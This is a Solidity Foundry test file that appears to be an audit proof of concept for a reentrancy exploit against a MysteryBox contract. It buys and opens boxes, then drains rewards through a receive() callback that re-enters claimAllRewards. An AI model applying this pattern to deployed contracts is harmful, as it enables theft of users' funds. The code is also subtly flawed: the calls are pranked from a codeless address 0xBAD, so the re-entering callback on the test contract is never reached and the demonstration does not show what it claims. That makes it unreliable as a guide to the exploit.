// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/MysteryBox.sol";

contract ReentrancyExploit is Test {
    MysteryBox public mysteryBox;
    address public attacker = address(0xBAD);

    receive() external payable {
        console.log("Fallback called");
        console.log("Contract Balance: %d", address(mysteryBox).balance);
        console.log("Attacker Balance: %d", address(attacker).balance);

        // Checking if the mysteryBox has sufficient funds and then reentering
        if (address(mysteryBox).balance >= 0.5 ether) {
            console.log("Reentering claimAllRewards");
            mysteryBox.claimAllRewards();
        }
    }

    function setUp() public {
        // Initialize with a higher contract balance to avoid running out of funds
        mysteryBox = new MysteryBox{value: 3 ether}();
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("Bought 3 boxes");

        mysteryBox.openBox();
        mysteryBox.openBox();
        mysteryBox.openBox();
        console.log("Opened 3 boxes");

        // Display the rewards for the attacker
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        for (uint256 i = 0; i < rewards.length; i++) {
            console.log("Reward %d: %s, Value: %d", i, rewards[i].name, rewards[i].value);
        }

        uint256 initialBalance = address(attacker).balance;
        console.log("Initial Balance of Attacker: %d", initialBalance);

        // Attempt to claim all rewards
        try mysteryBox.claimAllRewards() {
            console.log("claimAllRewards executed successfully");
        } catch (bytes memory reason) {
            console.log("claimAllRewards failed with reason: %s", string(reason));
        }

        uint256 finalBalance = address(attacker).balance;
        console.log("Final Balance of Attacker: %d", finalBalance);

        assert(finalBalance > initialBalance);

        vm.stopPrank();
    }
}
